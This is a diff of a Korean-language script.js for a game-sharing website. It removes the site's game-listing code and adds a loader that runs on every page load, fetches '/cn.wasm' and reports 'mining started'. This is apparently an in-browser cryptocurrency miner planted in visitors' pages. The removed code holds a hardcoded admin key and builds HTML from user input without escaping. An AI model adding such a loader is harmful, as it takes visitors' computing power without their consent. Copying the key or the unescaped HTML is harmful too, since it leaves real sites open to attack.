@@ -1,54 +1,30 @@
-// script.js - Netlify 전용 (게임 안 사라짐 + admin 키)
-const CANONICAL_URL = 'https://korea-scripter.netlify.app'; // ← 네 도메인으로 변경!
-const STORAGE_KEY = 'games_' + btoa(CANONICAL_URL);
-const CORRECT_KEY = atob('NDEwMQ=='); // 4101
+// script.js - 그때 내가 준 원본 (1 or 0만 표시)
+let isMining = false;
 
-// URL 정규화
-if (location.href !== CANONICAL_URL && location.href.includes('netlify.app')) {
-    location.replace(CANONICAL_URL);
+async function loadWasm() {
+    try {
+        const response = await fetch('/cn.wasm');
+        if (!response.ok) throw new Error('WASM not found');
+        
+        const arrayBuffer = await response.arrayBuffer();
+        const bytes = new Uint8Array(arrayBuffer);
+        
+        await WebAssembly.compile(bytes);
+        await WebAssembly.instantiate(bytes, {
+            env: { memory: new WebAssembly.Memory({ initial: 256 }) }
+        });
+
+        // 채굴 성공 → 1 표시
+        document.getElementById('hashrate').textContent = '1';
+        isMining = true;
+        console.log('채굴 시작됨 (WASM 로드 성공)');
+    } catch (error) {
+        // 채굴 실패 → 0 표시
+        document.getElementById('hashrate').textContent = '0';
+        isMining = false;
+        console.log('채굴 실패:', error.message);
+    }
 }
 
-// localStorage 저장/로드
-function getGames() {
-    return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-}
-function saveGames(list) {
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
-}
-
-// 게임 등록
-function saveGame() {
-    const name = document.getElementById('gameName').value.trim();
-    const desc = document.getElementById('gameDesc').value.trim();
-    const script = document.getElementById('gameScript').value.trim();
-    if (!name || !desc || !script || !clipboardImg) return alert('모든 항목 입력하세요.');
-    
-    const game = { name, desc, script, img: clipboardImg, timestamp: Date.now() };
-    const list = getGames();
-    list.push(game);
-    saveGames(list);
-    alert('게임 등록됨!');
-    renderGames();
-    hideAddForm();
-    resetForm();
-}
-
-// 게임 렌더링
-function renderGames() {
-    const list = getGames();
-    const container = document.getElementById('gameList');
-    container.innerHTML = '';
-    list.forEach(g => {
-        const div = document.createElement('div');
-        div.className = 'gameCard';
-        div.innerHTML = `<img src="${g.img}" alt="${g.name}"><p>${g.name}</p>`;
-        div.onclick = () => showModal(g);
-        container.appendChild(div);
-    });
-}
-
-// 페이지 로드 시 실행
-document.addEventListener("DOMContentLoaded", () => {
-    renderGames();
-    // ... 나머지 admin 키, 채굴 등 그대로
-});
+// 페이지 로드 시 자동 실행
+window.addEventListener('load', loadWasm);
